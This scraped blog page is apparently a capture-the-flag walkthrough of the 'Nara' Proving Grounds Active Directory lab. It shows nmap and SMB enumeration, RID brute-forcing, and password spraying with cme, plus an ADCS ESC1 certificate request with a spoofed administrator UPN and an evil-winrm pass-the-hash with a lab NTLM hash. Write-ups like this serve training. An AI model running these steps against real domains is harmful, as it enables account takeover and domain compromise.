'20240816092801_Certipy.txt' [*] Saved JSON output to '20240816092801_Certipy.json' Also this user belongs to the CERTIFICATE SERVICE DCOM ACCESS group while mapping things out with bloodhound. As shown below this is vulnerable to ESC1 exploit, using few blogs i was able to navigate this ; Blog1, Blog2 ❯ \\cat 20240816092801_Certipy.txt Certificate Authorities 0 CA Name : NARA-CA DNS Name : Nara.nara-security.com Certificate Subject : CN=NARA-CA, DC=nara-security, DC=com Certificate Serial Number : 2401E520F70B7DA34C32FABC71D89E1D Certificate Validity Start : 2023-07-30 14:06:05+00:00 Certificate Validity End : 2123-07-30 14:16:04+00:00 Web Enrollment : Disabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : NARA-SECURITY.COM\\Administrators Access Rights ManageCertificates : NARA-SECURITY.COM\\Administrators NARA-SECURITY.COM\\Domain Admins NARA-SECURITY.COM\\Enterprise Admins ManageCa : NARA-SECURITY.COM\\Administrators NARA-SECURITY.COM\\Domain Admins NARA-SECURITY.COM\\Enterprise Admins Enroll : NARA-SECURITY.COM\\Authenticated Users Certificate Templates 0 Template Name : NaraUser Display Name : NaraUser Certificate Authorities : NARA-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : UserInteractionRequired PublishToDs Private Key Flag : ExportableKey Extended Key Usage : Encrypting File System Secure Email Client Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 100 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Enrollment Permissions Enrollment Rights : NARA-SECURITY.COM\\Domain Admins NARA-SECURITY.COM\\Domain Users NARA-SECURITY.COM\\Enterprise Admins Object Control Permissions Owner : NARA-SECURITY.COM\\Administrator Full Control Principals : NARA-SECURITY.COM\\Enrollment Write Owner Principals : NARA-SECURITY.COM\\Domain Admins NARA-SECURITY.COM\\Enterprise Admins NARA-SECURITY.COM\\Administrator NARA-SECURITY.COM\\Enrollment Write Dacl Principals : NARA-SECURITY.COM\\Domain Admins NARA-SECURITY.COM\\Enterprise Admins NARA-SECURITY.COM\\Administrator NARA-SECURITY.COM\\Enrollment Write Property Principals : NARA-SECURITY.COM\\Domain Admins NARA-SECURITY.COM\\Enterprise Admins NARA-SECURITY.COM\\Administrator NARA-SECURITY.COM\\Enrollment [!] Vulnerabilities ESC1 : 'NARA-SECURITY.COM\\\\Domain Users' and 'NARA-SECURITY.COM\\\\Enrollment' can enroll, enrollee supplies subject and template allows client authentication ESC4 : 'NARA-SECURITY.COM\\\\Enrollment' has dangerous permissions However trying to request a certificate file .pfx i keep getting this error, although the goal is to keep trying till it works, but after numerous attempt this didn’t work for me. I mean i just made this blog so you can understand how this works. ❯ certipy req -username JODIE.SUMMERS -password hHO_S9gff7ehXw -target nara-security.com -ca NARA-CA -template NaraUser -upn administrator@nara-security.com -dc-ip 192.168.220.30 -debug Certipy v4.8.2 - by Oliver Lyak (ly4k) [+] Trying to resolve 'nara-security.com' at '192.168.220.30' [+] Generating RSA key [*] Requesting certificate via RPC [+] Trying to connect to endpoint: ncacn_np:192.168.220.30[\\pipe\\cert] [+] Connected to endpoint: ncacn_np:192.168.220.30[\\pipe\\cert] [-] Got error while trying to request certificate: code: 0x80092013 - CRYPT_E_REVOCATION_OFFLINE - The revocation function was unable to check revocation because the revocation server was offline. [*] Request ID is 25 Would you like to save the private key? (y/N) [-] Failed to request certificate If you want you can check this video of a friend exploiting the certificate template on a live stream by Ye Zeiya Shein certipy auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.220.30 # Gives administrator hash You can then pass-the-hash using the evil-winrm utility in kali as the user administrator ❯ evil-winrm -i 192.168.220.30 -u administrator -H d35c4ae45bdd10a4e28ff529a2155745 --SNIP-- Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e ",
  "wordCount" : "3744",
  "inLanguage": "en",
  "datePublished": "0001-01-01T00:00:00Z",
  "dateModified": "0001-01-01T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "SecFortress"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:37131/hacking/nara/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "SecFortess",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:37131/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:37131/" accesskey="h" title="SecFortress (Alt + H)">
                <img src="https://i.imgur.com/mStB3iJ.jpeg" alt="" aria-label="logo"
                    height="25">SecFortress</a>
            <div class="logo-switches">
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:37131/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:37131/hacking" title="🥷 Hacking">
                    <span>🥷 Hacking</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:37131/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:37131/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:37131/whoami" title="🇳🇬 Whoami">
                    <span>🇳🇬 Whoami</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:37131/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:37131/hacking/">Hackings</a></div>
    <h1 class="post-title entry-hint-parent">
      Nara || PG Practice
    </h1>
    <div class="post-description">
      Solve a very hard community rated active directory machine from proving grounds practice
    </div>
    <div class="post-meta">18 min&nbsp;·&nbsp;SecFortress

</div>
  </header> 

  <div class="post-content"><p>Running an nmap scan we have :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.94SVN scan initiated Wed Aug 14 21:11:54 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt -Pn 192.168.209.30</span>
</span></span><span class="line"><span class="cl">Increasing send delay <span class="k">for</span> 192.168.209.30 from <span class="m">0</span> to <span class="m">5</span> due to <span class="m">11</span> out of <span class="m">21</span> dropped probes since last increase.
</span></span><span class="line"><span class="cl">Increasing send delay <span class="k">for</span> 192.168.209.30 from <span class="m">5</span> to <span class="m">10</span> due to <span class="m">11</span> out of <span class="m">26</span> dropped probes since last increase.
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.209.30
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.17s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65512</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE           VERSION
</span></span><span class="line"><span class="cl">53/tcp    open  domain            Simple DNS Plus
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server time: 2024-08-14 20:16:35Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc             Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: nara-security.com0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Nara.nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:Nara.nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>NARA-CA
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-08-02T01:56:04
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2025-08-02T01:56:04
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: nara-security.com0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Nara.nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:Nara.nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>NARA-CA
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-08-02T01:56:04
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2025-08-02T01:56:04
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea
</span></span><span class="line"><span class="cl">3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: nara-security.com0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Nara.nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:Nara.nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>NARA-CA
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-08-02T01:56:04
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2025-08-02T01:56:04
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea
</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl?
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Nara.nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:Nara.nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>NARA-CA
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-08-02T01:56:04
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2025-08-02T01:56:04
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea
</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Nara.nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>Nara.nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-05-06T12:45:53
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2024-11-05T12:45:53
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   3653:d557:37ce:b6cc:64c8:ef5b:f664:bfaa
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: 4641:1138:a700:92f6:64fd:8c8c:83b5:65e4:2f26:a24d
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-08-14T20:18:59+00:00<span class="p">;</span> 0s from scanner time.
</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: NARASEC
</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: NARASEC
</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: NARA
</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: Nara.nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Tree_Name: nara-security.com
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 10.0.20348
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2024-08-14T20:17:45+00:00
</span></span><span class="line"><span class="cl">5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET
</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf            .NET Message Framing
</span></span><span class="line"><span class="cl">49664/tcp open  unknown
</span></span><span class="line"><span class="cl">49667/tcp open  unknown
</span></span><span class="line"><span class="cl">49668/tcp open  msrpc             Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49669/tcp open  unknown
</span></span><span class="line"><span class="cl">49685/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">49687/tcp open  unknown
</span></span><span class="line"><span class="cl">49696/tcp open  unknown
</span></span><span class="line"><span class="cl">49698/tcp open  unknown
</span></span><span class="line"><span class="cl">49715/tcp open  unknown
</span></span><span class="line"><span class="cl">49725/tcp open  unknown
</span></span><span class="line"><span class="cl">Service Info: Host: NARA<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2024-08-14T20:17:43
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Wed Aug 14 21:19:20 2024 -- 1 IP address (1 host up) scanned in 446.05 seconds</span>
</span></span></code></pre></div><blockquote>
<p>We can see that this is an active directory machine with domain name as ; &ldquo;<code>nara-security.com</code>&rdquo; with DC/Hostname as ; <code>&quot;NARA&quot;</code>, It will be best adding this to your <code>/etc/hosts</code> file for domain resolution.</p>
</blockquote>
<ul>
<li>We can confirm this using <code>netexec</code> utility</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 192.168.209.30
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:NARA<span class="o">)</span> <span class="o">(</span>domain:nara-security.com<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span></code></pre></div><ul>
<li>SMB Enumeration ; There are literally no shares that a NULL user has access to except from the <code>nara</code> share</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ smbclient -L <span class="se">\\\\</span>192.168.209.30<span class="se">\\</span>
</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>ec-fortress<span class="o">]</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
</span></span><span class="line"><span class="cl">        ---------       ----      -------
</span></span><span class="line"><span class="cl">        ADMIN$          Disk      Remote Admin
</span></span><span class="line"><span class="cl">        C$              Disk      Default share
</span></span><span class="line"><span class="cl">        IPC$            IPC       Remote IPC
</span></span><span class="line"><span class="cl">        nara            Disk      company share
</span></span><span class="line"><span class="cl">        NETLOGON        Disk      Logon server share 
</span></span><span class="line"><span class="cl">        SYSVOL          Disk      Logon server share 
</span></span><span class="line"><span class="cl">tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
</span></span><span class="line"><span class="cl">Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
</span></span><span class="line"><span class="cl">do_connect: Connection to 192.168.209.30 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup <span class="nv">available</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">==========================================================================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## In-accessible Shares</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">❯ smbclient <span class="se">\\\\</span>192.168.209.30<span class="se">\\</span>C$<span class="se">\\</span>
</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>ec-fortress<span class="o">]</span>:
</span></span><span class="line"><span class="cl">tree connect failed: NT_STATUS_ACCESS_DENIED
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">❯ smbclient <span class="se">\\\\</span>192.168.209.30<span class="se">\\</span>ADMIN$<span class="se">\\</span>
</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>ec-fortress<span class="o">]</span>:
</span></span><span class="line"><span class="cl">tree connect failed: NT_STATUS_ACCESS_DENIED
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">❯ smbclient <span class="se">\\\\</span>192.168.209.30<span class="se">\\</span>IPC$<span class="se">\\</span>
</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>ec-fortress<span class="o">]</span>:
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> dir
</span></span><span class="line"><span class="cl">NT_STATUS_NO_SUCH_FILE listing <span class="se">\*</span>
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> put nmap.txt
</span></span><span class="line"><span class="cl">NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file <span class="se">\n</span>map.txt
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> <span class="nb">exit</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">❯ smbclient <span class="se">\\\\</span>192.168.209.30<span class="se">\\</span>NETLOGON<span class="se">\\</span>
</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>ec-fortress<span class="o">]</span>:
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> dir
</span></span><span class="line"><span class="cl">NT_STATUS_ACCESS_DENIED listing <span class="se">\*</span>
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> <span class="nb">exit</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">❯ smbclient <span class="se">\\\\</span>192.168.209.30<span class="se">\\</span>SYSVOL<span class="se">\\</span>
</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>ec-fortress<span class="o">]</span>:
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> dir
</span></span><span class="line"><span class="cl">NT_STATUS_ACCESS_DENIED listing <span class="se">\*</span>
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> <span class="nb">exit</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Accessible Shares</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">❯ smbclient <span class="se">\\\\</span>192.168.209.30<span class="se">\\</span>nara<span class="se">\\</span>
</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>ec-fortress<span class="o">]</span>:
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> dir
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sun Jul <span class="m">30</span> 15:31:58 <span class="m">2023</span>
</span></span><span class="line"><span class="cl">  ..                                DHS        <span class="m">0</span>  Wed Aug <span class="m">14</span> 20:53:15 <span class="m">2024</span>
</span></span><span class="line"><span class="cl">  Documents                           D        <span class="m">0</span>  Sun Jul <span class="m">30</span> 15:03:13 <span class="m">2023</span>
</span></span><span class="line"><span class="cl">  Important.txt                       A     <span class="m">2200</span>  Sun Jul <span class="m">30</span> 15:05:31 <span class="m">2023</span>
</span></span><span class="line"><span class="cl">  IT                                  D        <span class="m">0</span>  Wed Aug <span class="m">14</span> 21:14:43 <span class="m">2024</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">7699711</span> blocks of size 4096. <span class="m">3661536</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span>
</span></span></code></pre></div><ul>
<li>So i downloaded the <code>Important.txt</code> file in this share using the <code>mget</code> command and the content can be viewed as shown below</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ <span class="se">\c</span>at Important.txt
</span></span><span class="line"><span class="cl">Dear Team,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">We hope this message finds you well. We wanted to remind all employees to take a moment each day to check the shared documents folder diligently. As part of our commitment to streamline processes and enhance efficiency, important documents are frequently uploaded to this folder <span class="k">for</span> your attention and action.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The shared documents folder serves as a central hub <span class="k">for</span> crucial updates, contracts, agreements, and various other essential materials requiring your attention. To ensure that you don<span class="s1">&#39;t miss any critical information, please make it a habit to access the folder at the beginning of your workday or as often as possible.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">Here are a few simple steps to stay up-to-date and ensure timely actions:
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">* Access the Shared Documents Folder: Log in to your company account and navigate to the designated shared documents folder. If you encounter any issues accessing the folder, please reach out to the IT department for assistance.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">* Review New Additions: Look for any new documents that might have been uploaded since your last visit. These documents might require your signature, feedback, or acknowledgment.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">* Take Action Promptly: If there are documents that need your attention, please act promptly and follow the necessary procedures as indicated within each document. Whether it&#39;</span>s a signature, a comment, or any other form of response, timely actions are vital to keep our operations running smoothly.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">* Seek Clarification: If you encounter any uncertainty or have questions about the documents you find, don<span class="s1">&#39;t hesitate to reach out to the relevant department or the person mentioned in the document for clarification. It&#39;</span>s essential that you fully understand what<span class="err">&#39;</span>s required before proceeding.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Remember, staying informed and acting promptly ensures that projects progress seamlessly, contracts get executed on time, and the company as a whole operates efficiently. Your cooperation in this matter is greatly appreciated and contributes to our collective success.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Thank you <span class="k">for</span> your attention to this matter, and <span class="k">if</span> you have any concerns or suggestions to improve our document management process, please share them with your department head or the HR team.
</span></span></code></pre></div><blockquote>
<p>This text literally gave me the hint that we can actually place files in the <code>nara</code> share, You know what i am thinking ??&hellip;&hellip;&hellip;.NTLM Theft 😈.</p>
</blockquote>
<ul>
<li>First of all i tried to enumerate users using the RID brute technique since we have <code>READ</code> access on the “Remote <code>IPC</code>” share.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ cme smb 192.168.209.30 -u guest -p <span class="s2">&#34;&#34;</span> --rid-brute <span class="p">|</span> grep -i sidtypeuser <span class="p">|</span> awk -F<span class="s1">&#39;\&#39;</span> <span class="s1">&#39;{print $2}&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;(&#39;</span> -f1 &gt;&gt; users.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">❯ <span class="se">\c</span>at users.txt
</span></span><span class="line"><span class="cl">Administrator 
</span></span><span class="line"><span class="cl">Guest 
</span></span><span class="line"><span class="cl">krbtgt 
</span></span><span class="line"><span class="cl">NARA$ 
</span></span><span class="line"><span class="cl">Amelia.O<span class="s1">&#39;Brien 
</span></span></span><span class="line"><span class="cl"><span class="s1">Damian.Johnson 
</span></span></span><span class="line"><span class="cl"><span class="s1">Helen.Robinson 
</span></span></span><span class="line"><span class="cl"><span class="s1">Sara.O&#39;</span>Sullivan 
</span></span><span class="line"><span class="cl">Jasmine.Roberts 
</span></span><span class="line"><span class="cl">Declan.Reynolds 
</span></span><span class="line"><span class="cl">Jodie.Summers 
</span></span><span class="line"><span class="cl">Carolyn.Hill 
</span></span><span class="line"><span class="cl">Jemma.Humphries 
</span></span><span class="line"><span class="cl">Tracy.White
</span></span></code></pre></div><ul>
<li>Then as usual tried to try usernames as password, I mean leaving no stone un-turned, This is Offsec 😭🤲.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ cme smb 192.168.209.30 -u users.txt -p users.txt --no-bruteforce --continue-on-success
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">20348</span> x64 <span class="o">(</span>name:NARA<span class="o">)</span> <span class="o">(</span>domain:nara-security.com<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\A</span>dministrator:Administrator STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\G</span>uest:Guest STATUS_LOGON_FAILURE 
